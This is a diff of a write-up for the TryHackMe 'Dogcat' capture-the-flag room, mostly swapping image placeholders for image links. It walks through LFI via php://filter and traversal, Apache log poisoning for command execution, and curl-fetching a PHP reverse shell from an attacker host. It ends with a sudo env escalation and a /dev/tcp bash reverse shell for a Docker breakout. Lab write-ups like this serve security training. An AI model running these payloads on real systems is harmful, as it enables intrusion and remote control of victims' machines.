@@ -1,4 +1,5 @@
 ---
+cover: ../.gitbook/assets/dogcat cover.PNG
 coverY: 0
 ---
 
@@ -14,7 +15,7 @@ I made a website where you can look at pictures of dogs and/or cats! Exploit a P
 **Optional setup:**\
 I like to save the target IP as a variable called TGT which can be used in commands and save having to type it out each time. Also makes copying commands from my notes a lot easier
 
-IMAGE tgtip
+![](../.gitbook/assets/tgtip.PNG)
 
 ## 1. Recon and enumeration
 
@@ -26,34 +27,34 @@ sudo nmap -sV -T4 -p- $TGT
 
 Options explained: -sV runs Version detection, -T4 is the timing template to use (0: slowest, 5: quickest), -p- scan all ports
 
-**nmap results:** IMAGE NMAP RESULT
+**nmap results:**
+
+<figure><img src="../.gitbook/assets/nmapresult.PNG" alt=""><figcaption></figcaption></figure>
 
 Points of interest from nmap results:\
-Port 22 open (SSH)\
-Port 80 open which will host our rooms web page using Apache 2.4.38
+**-** Port 22 open (SSH)\
+\- Port 80 open which will host our rooms web page using Apache 2.4.38
 
 ### 1.2 View Website
 
 We can navigate to the website in browser using the target IP `http://<TGTIP>`
 
-IMAGE WEB PAGE BLANK
+![](../.gitbook/assets/webpageBlank.PNG)
 
 From here I generally will browse the website as a user would (alongside viewing page sources) to get an idea of the websites functionality and purpose before using enumeration tools.
 
 In this case there is not much to be found through navigating or viewing the page source. Clicking either dog or cat shows an image but a point to note is in the URL where the view paramater is set to either dog or cat. As the room describes using LFI (Local File Inclusion) this parameter may be of use to us.
 
-IMAGE DOG WITH URL PARAM VIEW
+<figure><img src="../.gitbook/assets/webpageDog.PNG" alt=""><figcaption></figcaption></figure>
 
 ### 1.3 Web Enumeration
 
 **Directory enumeration (and by extension)**\
 To see if there were any other useful pages I used gobuster to check for any directories as well as using `-x php` to check for php files as from the room description we know we are looking to exploit PHP.
 
-```bash
-gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php
-```
+<pre class="language-bash"><code class="lang-bash"><strong>gobuster dir -u http://$TGT -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php</strong></code></pre>
 
-IMAG GOBUSTER RESULTS
+IMAGE GOBUSTER RESULTS
 
 **Points of interest from scan:**\
 index.php - Likely to show how the webpage we have seen works\
@@ -63,6 +64,8 @@ dogs/cats directory - Status code 301 means we do not have access
 ## 2. Exploitation
 
 ### 2.1 LFI
+
+!!**TO ORGANISE!!**
 
 Must contain cat and dog allowed trying to go to file
 
@@ -74,9 +77,13 @@ http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
 
 Applying this to our request format to view index.php
 
+!!**TO ORGANISE!!**
+
 **/?view=php://filter/read=convert.base64-encode/resource=./dog/../index**
 
 Explanation: From the web enumeration we know that if we change to the dog directory (meets containing dog in request), we then need to go back up a directory to end up back at the start in order to view the index page. The .php for index is not included as we know the filter will be appended with .php to our parameter.
+
+![](../.gitbook/assets/indexwebb64.PNG)
 
 This returns us the contents of index.php base64 encoded I copied the encoded text into a file on my machine and decoded it using
 
@@ -84,7 +91,7 @@ This returns us the contents of index.php base64 encoded I copied the encoded te
 base64 -d indexbase64.txt
 ```
 
-Insert PHP source of index.html
+<figure><img src="../.gitbook/assets/indexphpdecoded.PNG" alt=""><figcaption></figcaption></figure>
 
 From viewing index.php we can identify another parameter that can be set in our request. This is the **ext** value as seen in the line
 
@@ -98,18 +105,18 @@ Knowing we can read local files we can look to **read flag1** similar to how we 
 
 As before the returned base 64 needs to be decoded using `base64 -d` giving us our first flag
 
-INSERT IMAGE FLAG1
+![](<../.gitbook/assets/flag1 Decoded.PNG>)
 
 We can also use our knowledge of the ext parameter to view /etc/passwd /?view=./dog/../../../../../../../etc/passwd\&ext
 
 ### 2.3 PHP Log poisoning
 
-Now that we know how to read files on the target system we can look to view access logs which will record requests we make to the web server. From our nmap scan we know we are dealing with an Apache server V 2.4.38 which you may know the log file location of from prvious experience but if not a google search can provide you with the results which is what I had to do and found the answer [here](https://phoenixnap.com/kb/apache-access-log)
+Now that we know how to read files on the target system we can look to view access logs which will record requests we make to the web server. From our nmap scan we know we are dealing with an Apache server V 2.4.38 which you may know the log file location of from previous experience but if not a google search can provide you with the results which is what I had to do and found the answer [here](https://phoenixnap.com/kb/apache-access-log)
 
 **Viewing log file** Using LFI directory traversal and keeping the ext parameter blank\
 **/?view=./dog/../../../../../../../var/log/apache2/access.log\&ext=**
 
-IMAGE LOG FILE
+![](../.gitbook/assets/logFileFirst.PNG)
 
 **Using curl to poison log**
 
@@ -125,17 +132,17 @@ If we know take a look at the log file again it now shows:\
 
 Note: If you are struggling to read through the log file in browser viewing the page source can help neaten it up a bit
 
-IMAGE WARNING
+<figure><img src="../.gitbook/assets/phppoison warning.PNG" alt=""><figcaption><p>PHP Warning</p></figcaption></figure>
 
 This shows us that our PHP log poisoning has worked but we just haven't set our 'cmd' parameter. We can perform a quick test using the cmd `id`
 
 **/?view=./dog/../../../../../../../var/log/apache2/access.log\&ext=\&cmd=id**
 
-IMAGE RESULT PHPID
+<figure><img src="../.gitbook/assets/phppoisonID.PNG" alt=""><figcaption><p>cmd id results (viewing page source)</p></figcaption></figure>
 
 ### 2.3 Create a Reverse Shell
 
-INSERT LINK TO SHELLS TO TRY
+**!!INSERT LINK TO SHELLS TO TRY!!**
 
 Set up listener on machine:
 
@@ -145,7 +152,7 @@ nc -nvlp 4444
 
 I inserted the well known **PHP shell** from pentestmonkey which can be found at: [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) making sure to change the ip and port number to match my workstation IP and the port number to that in the netcat listener I set up.
 
-IMAGE MONKEYSHELL
+![](../.gitbook/assets/monkeySHell.PNG)
 
 Host a python web server for target to download our reverse shell from. Ensure this is either in the same folder as the reverse shell or adjust the curl command ahead in order to reach the correct directory.
 
@@ -165,20 +172,20 @@ Putting this curl command into our LFI URL we get the final result:
 
 **http://10.10.150.242/?view=./dog/../../../../../../../var/log/apache2/access.log\&ext\&cmd=curl http://10.14.23.1:8080/monkeyshell.php -o shell.php**
 
-Our python server lets us know when our target machine has downloaded our shell
+Our python server lets us know when our target machine has downloaded our shell:
 
-INSERT WEBDOWLOAD
+<figure><img src="../.gitbook/assets/webdownlaod.PNG" alt=""><figcaption></figcaption></figure>
 
 In order to get our shell.php to execute we remember back to using LFI to read index.php, so we use the following (remember by default .php will be added)\
 **http://10.10.150.242/?view=./dog/../shell**
 
-IMAGE REVERSE SHELL
+<figure><img src="../.gitbook/assets/webshellFirst.PNG" alt=""><figcaption></figcaption></figure>
 
 **SUCCESS**, we have our reverse shell on our machine
 
 ## 3. Post Compromise Enumeration
 
-## 3.1 Find some flags
+### 3.1 Find some flags
 
 Looking back at the THM room we are in search of flags so I ran a find command to check for accessible flags. I used -iname to make the search **case insensitive** as sometimes creators use different cases through the filename.
 
@@ -186,11 +193,11 @@ Looking back at the THM room we are in search of flags so I ran a find command t
 find / -type f -iname "flag*" 2>/dev/null
 ```
 
-This reurns us two results at:
+![](<../.gitbook/assets/flag search.PNG>)
 
-Which we can `cat` out and get our first two flags (if you didn't grab flag 1 earlier with LFI)
+This returns us two results which we can `cat` out and get our first two flags (if you didn't grab flag 1 earlier with LFI)
 
-IMAGE FLAG 1 AND 2
+![](../.gitbook/assets/Flag2.PNG)
 
 ## 4. Privilege Escalation
 
@@ -204,7 +211,7 @@ sudo env /bin/shpwd
 
 Running the find command as above or going straight to /root directory we can find flag 3
 
-IMAGE FLAG 3
+![](<../.gitbook/assets/priv esc and flag 3.PNG>)
 
 ### 4.2 Break out of the Docker Container
 
@@ -225,7 +232,7 @@ echo "/bin/bash -c 'bash -i >& /dev/tcp/10.14.23.1/5555 0>&1'" >> backup.sh
 
 In my case in less than a minute my new shell was created and flag4 was waiting for collection in the current directory.
 
-!\[\[../../ZZ - Pasted Images/Pasted image 20220927091441.png]]
+<figure><img src="../.gitbook/assets/Container breakout (1).png" alt=""><figcaption></figcaption></figure>
 
 Thanks for reading my writeup of the Dogcat room.
 
